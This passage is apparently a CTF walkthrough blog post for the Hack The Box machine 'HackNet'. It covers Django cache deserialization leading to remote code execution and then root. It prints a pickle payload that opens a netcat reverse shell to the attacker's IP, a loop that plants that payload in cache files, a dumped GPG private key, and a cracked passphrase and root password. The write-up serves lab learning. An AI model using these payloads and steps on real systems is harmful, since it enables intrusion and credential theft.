+<li><p>Access &#x2F;explore to generate cache files</p>
+</li>
+<li><p>Overwrite cached objects with a malicious pickle</p>
+</li>
+<li><p>Revisit &#x2F;explore to trigger execution</p>
+</li>
+</ol>
+<p>Pickle payload:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">&quot;busybox nc 10.10.16.21 4444 -e sh&quot;</span>,),)</span><br><span class="line"></span><br><span class="line">payload = base64.b64encode(pickle.dumps(Exploit()))</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">ls</span>); <span class="keyword">do</span> <span class="built_in">rm</span> -f <span class="variable">$i</span>;  <span class="built_in">echo</span> <span class="string">&#x27;gASVPAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCFidXN5Ym94IG5jIDEwLjEwLjE2LjIxIDQ0NDQgLWUgc2iUhZRSlC4=&#x27;</span> |<span class="built_in">base64</span> -d&gt; <span class="variable">$i</span>; <span class="built_in">chmod</span> 777 <span class="variable">$i</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Overwrite cache files and set permissions, then start a listener:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\HP\Downloads&gt; .\nc64.exe -lvnp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.10.16.21] from (UNKNOWN) [10.10.11.85] 58846</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1001(sandy) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br></pre></td></tr></table></figure></div>
+
+
+<p>Shell received as:</p>
+<p><code>uid=1001(sandy) gid=33(www-data)</code></p>
+<p>Lateral Movement – Sandy</p>
+<p>A GPG private key is found:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">sandy@hacknet:~$ <span class="built_in">ls</span> -al</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">total 36</span><br><span class="line">drwx------ 6 sandy sandy 4096 Sep 11 11:18 .</span><br><span class="line">drwxr-xr-x 4 root  root  4096 Jul  3  2024 ..</span><br><span class="line">lrwxrwxrwx 1 root  root     9 Sep  4 19:01 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 sandy sandy  220 Apr 23  2023 .bash_logout</span><br><span class="line">-rw-r--r-- 1 sandy sandy 3526 Apr 23  2023 .bashrc</span><br><span class="line">drwxr-xr-x 3 sandy sandy 4096 Jul  3  2024 .cache</span><br><span class="line">drwx------ 3 sandy sandy 4096 Dec 21  2024 .config</span><br><span class="line">drwx------ 4 sandy sandy 4096 Sep  5 11:33 .gnupg</span><br><span class="line">drwxr-xr-x 5 sandy sandy 4096 Jul  3  2024 .<span class="built_in">local</span></span><br><span class="line">lrwxrwxrwx 1 root  root     9 Aug  8  2024 .mysql_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 sandy sandy  808 Jul 11  2024 .profile</span><br><span class="line">lrwxrwxrwx 1 root  root     9 Jul  3  2024 .python_history -&gt; /dev/null</span><br><span class="line">sandy@hacknet:~$ <span class="built_in">cd</span> .gnupg</span><br><span class="line"><span class="built_in">cd</span> .gnupg</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">sandy@hacknet:~/.gnupg$ <span class="built_in">ls</span></span><br><span class="line">openpgp-revocs.d   pubring.kbx   random_seed</span><br><span class="line">private-keys-v1.d  pubring.kbx~  trustdb.gpg</span><br><span class="line">sandy@hacknet:~/.gnupg$</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">sandy@hacknet:~/.gnupg/private-keys-v1.d$ <span class="built_in">cat</span> armored_key.asc</span><br><span class="line"><span class="built_in">cat</span> armored_key.asc</span><br><span class="line">-----BEGIN PGP PRIVATE KEY BLOCK-----</span><br><span class="line"></span><br><span class="line">lQIGBGdxrxABBACuOrGzU2PoINX/6XsSWP9OZuFU67Bf6qhsjmQ5CcZ340oNlZfl</span><br><span class="line">LsXqEywJtXhjWzAd5Juo0LJT7fBWpU9ECG+MNU7y2Lm0JjALHkIwq4wkGHJcb5AO</span><br><span class="line">949lXlA6aC/+CuBm/vuLHtYrISON7LyUPAycmf8wKnE7nX9g4WY000k8ywARAQAB</span><br><span class="line">/gcDAoUP+2418AWL/9s1vSnZ9ABrtqXgH1gmjZbbfm0WWh2G9DJ2pKYamGVVijtn</span><br><span class="line">29HGsMJblg0pPNSQ0PVCJ3iPk2N6kwoYWrhrxtS/0yT9tPkItBaW9x2wGzkwzfvI</span><br><span class="line">VKga32QvV5f5Td9+ZwUt7UKO5t5p/Uw48Mbbn8zGcwR5tIr95ngCfQYo8LkEZpkD</span><br><span class="line">Mpm8N7A0XFHX+lH4PD2Fe3Kh5XqPODAurYlTe2yyuI0KlThUq2sM2tSvBp5prQtO</span><br><span class="line">Tw6bcPw3QjBtLdslXKB+sQGwfXP2mkvSceRhLACDgO9NXDtvoKg6s36zyIqSQN3t</span><br><span class="line">qCOP0gLMyc8Ha20hYC3SOUNJlQvn3kQGGL+TvN5z5or6WQoUXcDh88h7dMDiqWyP</span><br><span class="line">41SGikDsCd0he4FbMQpBRJ3F+9/KUT+t1e6uQrZTia7MYo6UtftZzOJBacjNWYFm</span><br><span class="line">gd57WOXw0OWvJnvHWo7+CXK6fm43aOyWBASI5ceyqgpOsQR+eTcrNgW0LlNhbmR5</span><br><span class="line">IChNeSBrZXkgZm9yIGJhY2t1cHMpIDxzYW5keUBoYWNrbmV0Lmh0Yj6IzgQTAQoA</span><br><span class="line">OBYhBCE5XheHLmT0dL+A8dcuXB+hnBL3BQJnca8QAhsDBQsJCAcCBhUKCQgLAgQW</span><br><span class="line">AgMBAh4BAheAAAoJENcuXB+hnBL3OygD/i19Xdsp0piT/79WFufUQ9uySefvFvL0</span><br><span class="line">ZyEzFBK6T4ohzr75zxjhpYzB5f5HeCIqsAEkL4mbrPwtfPzVTlCk9jTpcVKwhujx</span><br><span class="line">Zcxnrae+0NAVUQunoG/Pl78vLFm4kNX5GGmQCsyBmxkJT6nMvnc2f0d3VBIb2DQ7</span><br><span class="line">QS/B6YTEEdsnnQIGBGdxrxABBADt/tOJab+s3LZcY7DpnTUMZW5tM2yuDiPuUj02</span><br><span class="line">1rdgHJ1n27xxuf5Fww+4cS9vh/J9kci/wf7viRhn+go/4vsTI1naYsjxglikIqmJ</span><br><span class="line">lfP9XuE/2EwffMUk9bWxIfKOkfxm6o6c/joCLM754s9Ol6ZzacWT0XkF0iHPHiO6</span><br><span class="line">tBJ/1QARAQAB/gcDApmMnZiDMpwi/weiKIkgNy7+3AoTmgxjP7ELI1YdeMpLpOjp</span><br><span class="line">StHkIqKxpYPMX63a+3kS04c8yDLdYAKNz7E5CbFRI8Qoe//xsnOsjMi2jWuM5afC</span><br><span class="line">79cBCxJHdgIF5/zC/dHW+QQfMpZ4ieqB0HR7eJ7F8IY1kGxbuwZV7tIgd+Wtmniq</span><br><span class="line">t+J1TAtYoQCfLpAxzWAW/4SXBARzoI6CTeRFjABdteT8qW6MuvNK5ZP+KxlGnlcE</span><br><span class="line">DdeAGSY1nc7Enq06he5DECNt8+aoImWJ4oN+Rsw01k8SfAHU0fo9HgxCBxkwBnmX</span><br><span class="line">3zJCIFj09cpmHl3jlDjlyx21SKqKLIZ/qywdMohr2VRAPKL0A+LmrfxZQ80Tz3SW</span><br><span class="line">/bX4EznnaJeIIDKINS5Vzhdf8O5L4t6Swtj7r8cTGs37yeoVUcIH52Zjkr2l7WSi</span><br><span class="line">GT6u2xOpLeVbKqSpesJjucdGBKevANfMNcGinS9xUUdn7MDMI81P9oNSbFD+ZIBJ</span><br><span class="line">BP2ItgQYAQoAIBYhBCE5XheHLmT0dL+A8dcuXB+hnBL3BQJnca8QAhsMAAoJENcu</span><br><span class="line">XB+hnBL3YBgEAKsNo9aR7rfIaBdXAI1lFWsfBDuV28mTo8RgoE40rg+U4a2vPJAt</span><br><span class="line">DZNUnvaugNdG2nNkX1b4U+fNJMR07GCAJIGVrQojqnSVCKYjI4Et7VtRIlOI7Bmr</span><br><span class="line">UWLDskLCqTD33o4VOV3IITVkQc9KktjhI74C7kZrOr7v07yuegmtzLi+</span><br><span class="line">=wR12</span><br><span class="line">-----END PGP PRIVATE KEY BLOCK-----</span><br><span class="line">sandy@hacknet:~/.gnupg/private-keys-</span><br></pre></td></tr></table></figure></div>
+
+<p>Cracking the key:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">gpg2john armored_key.asc &gt; hash.txt</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ john  --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (gpg, OpenPGP / GnuPG Secret Key [32/64])</span><br><span class="line">Cost 1 (s2k-count) is 65011712 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Cost 2 (<span class="built_in">hash</span> algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">sweetheart       (Sandy)     </span><br><span class="line">1g 0:00:00:06 DONE (2025-09-19 08:09) 0.1470g/s 62.35p/s 62.35c/s 62.35C/s 246810..ladybug</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br></pre></td></tr></table></figure></div>
+
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sandy@hacknet:/var/www/HackNet/backups$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">backup01.sql.gpg  backup02.sql.gpg  backup03.sql.gpg</span><br><span class="line">sandy@hacknet:/var/www/HackNet/backups$</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sandy@hacknet:/var/www/HackNet/backups$ gpg --import ~/.gnupg/private-keys-v1.d/armored_key.asc</span><br><span class="line">&lt;--import ~/.gnupg/private-keys-v1.d/armored_key.asc</span><br><span class="line">gpg: key D72E5C1FA19C12F7: <span class="string">&quot;Sandy (My key for backups) &lt;sandy@hacknet.htb&gt;&quot;</span> not changed</span><br><span class="line">gpg: key D72E5C1FA19C12F7: secret key imported</span><br><span class="line">gpg: Total number processed: 1</span><br><span class="line">gpg:              unchanged: 1</span><br><span class="line">gpg:       secret keys <span class="built_in">read</span>: 1</span><br><span class="line">gpg:  secret keys unchanged: 1</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sandy@hacknet:/var/www/HackNet/backups$ gpg --batch --<span class="built_in">yes</span> --passphrase <span class="string">&quot;sweetheart&quot;</span> --pinentry-mode loopback -o <span class="string">&quot;/tmp/backup.decrypted&quot;</span> -d <span class="string">&quot;backup01.sql.gpg&quot;</span></span><br><span class="line">&lt;ck -o <span class="string">&quot;/tmp/backup.decrypted&quot;</span> -d <span class="string">&quot;backup01.sql.gpg&quot;</span></span><br><span class="line">gpg: encrypted with 1024-bit RSA key, ID FC53AFB0D6355F16, created 2024-12-29</span><br><span class="line">      <span class="string">&quot;Sandy (My key for backups) &lt;sandy@hacknet.htb&gt;&quot;</span></span><br><span class="line">      </span><br><span class="line">sandy@hacknet:/var/www/HackNet/backups$ gpg --batch --<span class="built_in">yes</span> --passphrase <span class="string">&quot;sweetheart&quot;</span> --pinentry-mode loopback -o <span class="string">&quot;/tmp/backup02&quot;</span> -d <span class="string">&quot;backup02.sql.gpg&quot;</span></span><br><span class="line">&lt;e loopback -o <span class="string">&quot;/tmp/backup02&quot;</span> -d <span class="string">&quot;backup02.sql.gpg&quot;</span></span><br><span class="line">gpg: encrypted with 1024-bit RSA key, ID FC53AFB0D6355F16, created 2024-12-29</span><br><span class="line">      <span class="string">&quot;Sandy (My key for backups) &lt;sandy@hacknet.htb&gt;&quot;</span></span><br><span class="line">sandy@hacknet:/var/www/HackNet/backups$ gpg --batch --<span class="built_in">yes</span> --passphrase <span class="string">&quot;sweetheart&quot;</span> --pinentry-mode loopback -o <span class="string">&quot;/tmp/backup03&quot;</span> -d <span class="string">&quot;backup03.sql.gpg&quot;</span></span><br><span class="line">&lt;e loopback -o <span class="string">&quot;/tmp/backup03&quot;</span> -d <span class="string">&quot;backup03.sql.gpg&quot;</span></span><br><span class="line">gpg: encrypted with 1024-bit RSA key, ID FC53AFB0D6355F16, created 2024-12-29</span><br><span class="line">      <span class="string">&quot;Sandy (My key for backups) &lt;sandy@hacknet.htb&gt;&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sandy@hacknet:/tmp$ strings backup* | grep -i password</span><br><span class="line">strings backup* | grep -i password</span><br><span class="line">ve been refining my techniques to make them more efficient, reducing the time it takes to crack even the most complex passwords. Writing up a guide on how to optimize your brute force attacks.<span class="string">&#x27;,&#x27;</span>2024-08-30 14:19:57.000000<span class="string">&#x27;,6,2,0,24);</span></span><br><span class="line"><span class="string">(11,&#x27;</span>Reducing the time to crack complex passwords is no small feat. Even though brute force is noisy, it</span><br><span class="line">(47,<span class="string">&#x27;2024-12-29 20:29:36.987384&#x27;</span>,<span class="string">&#x27;Hey, can you share the MySQL root password with me? I need to make some changes to the database.&#x27;</span>,1,22,18),</span><br><span class="line">(48,<span class="string">&#x27;2024-12-29 20:29:55.938483&#x27;</span>,<span class="string">&#x27;The root password? What kind of changes are you planning?&#x27;</span>,1,18,22),</span><br><span class="line">s the password: h4ck3rs4re3veRywh3re99. Let me know when you</span><br><span class="line">  `password` varchar(70) NOT NULL,</span><br><span class="line">(24,<span class="string">&#x27;brute_force@ciphermail.com&#x27;</span>,<span class="string">&#x27;brute_force&#x27;</span>,<span class="string">&#x27;BrUt3F0rc3#&#x27;</span>,<span class="string">&#x27;24.jpg&#x27;</span>,<span class="string">&#x27;Specializes in brute force attacks and password cracking. Loves the challenge of breaking into locked systems.&#x27;</span>,0,0,1,0,0),</span><br><span class="line">  `password` varchar(128) NOT NULL,</span><br><span class="line">ve been refining my techniques to make them more efficient, reducing the time it takes to crack even the most complex passwords. Writing up a guide on how to optimize your brute force attacks.<span class="string">&#x27;,&#x27;</span>2024-08-30 14:19:57.000000<span class="string">&#x27;,6,2,0,24);</span></span><br><span class="line"><span class="string">(11,&#x27;</span>Reducing the time to crack complex passwords is no small feat. Even though brute force is noisy, it</span><br><span class="line">  `password` varchar(70) NOT NULL,</span><br><span class="line">(24,<span class="string">&#x27;brute_force@ciphermail.com&#x27;</span>,<span class="string">&#x27;brute_force&#x27;</span>,<span class="string">&#x27;BrUt3F0rc3#&#x27;</span>,<span class="string">&#x27;24.jpg&#x27;</span>,<span class="string">&#x27;Specializes in brute force attacks and password cracking. Loves the challenge of breaking into locked systems.&#x27;</span>,0,0,1,0,0),</span><br><span class="line">  `password` varchar(128) NOT NULL,</span><br><span class="line">ve been refining my techniques to make them more efficient, reducing the time it takes to crack even the most complex passwords. Writing up a guide on how to optimize your brute force attacks.<span class="string">&#x27;,&#x27;</span>2024-08-30 14:19:57.000000<span class="string">&#x27;,6,2,0,24);</span></span><br><span class="line"><span class="string">(11,&#x27;</span>Reducing the time to crack complex passwords is no small feat. Even though brute force is noisy, it</span><br><span class="line">  `password` varchar(70) NOT NULL,</span><br><span class="line">(24,<span class="string">&#x27;brute_force@ciphermail.com&#x27;</span>,<span class="string">&#x27;brute_force&#x27;</span>,<span class="string">&#x27;BrUt3F0rc3#&#x27;</span>,<span class="string">&#x27;24.jpg&#x27;</span>,<span class="string">&#x27;Specializes in brute force attacks and password cracking. Loves the challenge of breaking into locked systems.&#x27;</span>,0,0,1,0,0),</span><br><span class="line">  `password` varchar(128) NOT NULL,</span><br></pre></td></tr></table></figure></div>
+
+
+<p>Decrypting reveals the root password:</p>
+<p><code>root:h4ck3rs4re3veRywh3re99</code></p>
+<p>Switch user with <code>su root</code></p>
+<p>Root access achieved!</p>
+<p>That was it for HackNet, hope you learned something new!</p>
+<p>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: HackNet</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2026-01-16 17:15:01</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-01-16 17:23:05
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2026/01/16/Hackthebox-HackNet/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2026/01/10/Hackthebox-Previous/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Previous</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: HackNet</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-Application-Analysis"><span class="nav-text">Web Application Analysis</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Credential-Extraction"><span class="nav-text">Credential Extraction</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Initial-Access-%E2%80%93-SSH"><span class="nav-text">Initial Access – SSH</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Django-Cache-Deserialization-RCE"><span class="nav-text">Django Cache Deserialization (RCE)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploitation"><span class="nav-text">Exploitation</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
